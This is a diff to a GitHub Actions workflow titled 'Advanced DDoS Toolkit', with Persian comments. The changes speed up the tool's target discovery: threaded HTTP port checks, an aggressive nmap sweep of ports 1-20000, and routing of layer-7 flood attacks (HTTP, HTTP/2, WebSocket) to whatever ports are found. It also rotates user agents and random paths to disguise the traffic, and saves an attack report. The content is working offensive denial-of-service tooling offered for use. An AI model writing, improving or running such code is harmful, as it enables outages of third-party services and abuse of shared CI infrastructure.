@@ -1,4 +1,4 @@
-name: Advanced DDoS Toolkit with Report & Fast Scan
+name: Advanced DDoS Toolkit with Ultra-Fast Discovery
 
 on:
   workflow_dispatch:
@@ -63,7 +63,7 @@ jobs:
           THREADS: ${{ github.event.inputs.threads }}
         run: |
           python3 << 'PYEOF'
-          import os, sys, time, socket, threading, random, nmap, asyncio, aiohttp, json
+          import os, sys, time, socket, threading, random, nmap, asyncio, aiohttp, json, concurrent.futures
           from datetime import datetime, timedelta
           from pathlib import Path
           from rich.console import Console
@@ -119,14 +119,47 @@ jobs:
               for prefix in ['https://', 'http://']:
                   if target.startswith(prefix): target = target[len(prefix):]
               target = target.split('/')[0].split(':')[0]
-              try: return socket.gethostbyname(target)
-              except: return None
+              try:
+                  # استفاده از getaddrinfo برای سرعت بیشتر
+                  addrs = socket.getaddrinfo(target, None, socket.AF_INET, socket.SOCK_STREAM)
+                  return addrs[0][4][0]
+              except:
+                  return None
 
-          # اسکن فوق سریع
-          def scan_open_ports(ip, port_range='1-10000'):
-              console.print(f"[cyan]🔍 اسکن سریع {ip}...[/cyan]")
+          # ===== اسکن فوق سریع پورت‌ها =====
+          COMMON_HTTP_PORTS = [80, 443, 8080, 8443, 3000, 8000, 9000, 5000, 4000, 4443]
+          
+          def check_port(ip, port, timeout=0.8):
+              try:
+                  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                  sock.settimeout(timeout)
+                  result = sock.connect_ex((ip, port))
+                  sock.close()
+                  return port if result == 0 else None
+              except:
+                  return None
+
+          def fast_http_scan(ip):
+              """اسکن سریع پورت‌های رایج HTTP/HTTPS با threading"""
+              console.print("[cyan]⚡ اسکن سریع پورت‌های HTTP...[/cyan]")
+              open_ports = []
+              with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
+                  future_to_port = {executor.submit(check_port, ip, port): port for port in COMMON_HTTP_PORTS}
+                  for future in concurrent.futures.as_completed(future_to_port):
+                      port = future_to_port[future]
+                      try:
+                          res = future.result()
+                          if res is not None:
+                              open_ports.append({'port': res, 'service': 'http' if res in (80,8080,8000,3000,5000,4000) else 'https'})
+                      except:
+                          pass
+              return open_ports
+
+          def deep_scan_ports(ip):
+              """Nmap کامل برای پورت‌های غیر HTTP"""
+              console.print(f"[cyan]🔍 Nmap با سرعت بالا روی {ip}...[/cyan]")
               nm = nmap.PortScanner()
-              nm.scan(hosts=ip, arguments=f'-sT -sV -p {port_range} --min-rate 5000 --max-retries 1')
+              nm.scan(hosts=ip, arguments=f'-sT -sV -p 1-20000 --min-rate 10000 --max-retries 0')
               open_ports = []
               if ip in nm.all_hosts():
                   for proto in nm[ip].all_protocols():
@@ -136,7 +169,18 @@ jobs:
                               open_ports.append({'port': port, 'service': service})
               return open_ports
 
-          # ===== لیست User-Agent =====
+          def discover_ports(ip, attack_type):
+              # اگر لایه ۷ باشه، اول اسکن سریع HTTP
+              if attack_type.startswith('l7'):
+                  ports = fast_http_scan(ip)
+                  if ports:
+                      console.print(f"[green]⚡ {len(ports)} پورت HTTP با اسکن سریع پیدا شد.[/green]")
+                      return ports
+                  else:
+                      console.print("[yellow]⚠️ اسکن سریع چیزی پیدا نکرد، Nmap عمیق انجام می‌شود...[/yellow]")
+              return deep_scan_ports(ip)
+
+          # ===== User-Agent و مسیرهای تصادفی =====
           USER_AGENTS = [
               "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
               "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
@@ -174,7 +218,6 @@ jobs:
           def get_random_ua():
               return random.choice(USER_AGENTS)
 
-          # ===== مسیرهای تصادفی =====
           RANDOM_PATHS = [
               "/", "/index.html", "/home", "/about", "/contact", "/api/v1/status", "/api/v2/users",
               "/login", "/signup", "/search", "/products", "/categories", "/blog", "/news",
@@ -312,7 +355,7 @@ jobs:
           PORT_ARG = os.environ["TARGET_PORT"].strip().lower()
 
           console.print(f"[bold red]╔══════════════════════════════════════╗[/bold red]")
-          console.print(f"[bold red]║   🛡️  DDoS Toolkit - نسخه حرفه‌ای   ║[/bold red]")
+          console.print(f"[bold red]║   🛡️  DDoS Toolkit - نسخه فوق سریع   ║[/bold red]")
           console.print(f"[bold red]╚══════════════════════════════════════╝[/bold red]")
 
           ip = resolve_target(TARGET)
@@ -329,16 +372,13 @@ jobs:
 
           if target_ports is None:
               if PORT_ARG == 'auto':
-                  open_ports = scan_open_ports(ip)
+                  open_ports = discover_ports(ip, ATTACK)
                   if not open_ports:
                       console.print("[red]❌ هیچ پورت بازی پیدا نشد.[/red]")
                       sys.exit(1)
                   update_cache(ip, TARGET, open_ports)
-                  if ATTACK in ('l7_http_flood', 'l7_http2_flood', 'l7_mixed_flood', 'l7_ws_flood'):
-                      target_ports = [p['port'] for p in open_ports if 'http' in p['service'].lower() or 'ssl' in p['service'].lower()]
-                      if not target_ports:
-                          console.print("[yellow]⚠️ پورت HTTP پیدا نشد، استفاده از همه پورت‌های باز...[/yellow]")
-                          target_ports = [p['port'] for p in open_ports]
+                  if ATTACK.startswith('l7'):
+                      target_ports = [p['port'] for p in open_ports]
                   else:
                       target_ports = [p['port'] for p in open_ports]
               else:
@@ -383,7 +423,6 @@ jobs:
           final = get_stats()
           console.print("\n[bold green]✅ عملیات پایان یافت.[/bold green]")
 
-          # ===== ذخیره گزارش در فایل =====
           success_rate = (final['success']/(final['sent'] or 1))*100
           report_content = f"""📊 گزارش حمله DDoS
 ========================
@@ -401,7 +440,7 @@ jobs:
           with open(REPORT_FILE, 'w') as f:
               f.write(report_content)
           os.system(f"git add {REPORT_FILE} && git commit -m 'Add attack report' && git push 2>/dev/null || true")
-          console.print(f"[green]📄 گزارش حمله در {REPORT_FILE} ذخیره و به مخزن ارسال شد.[/green]")
+          console.print(f"[green]📄 گزارش حمله در {REPORT_FILE} ذخیره شد.[/green]")
 
           summary = Table(title="📊 گزارش نهایی", show_header=True)
           summary.add_column("متریک", style="cyan"); summary.add_column("مقدار", style="bold white")
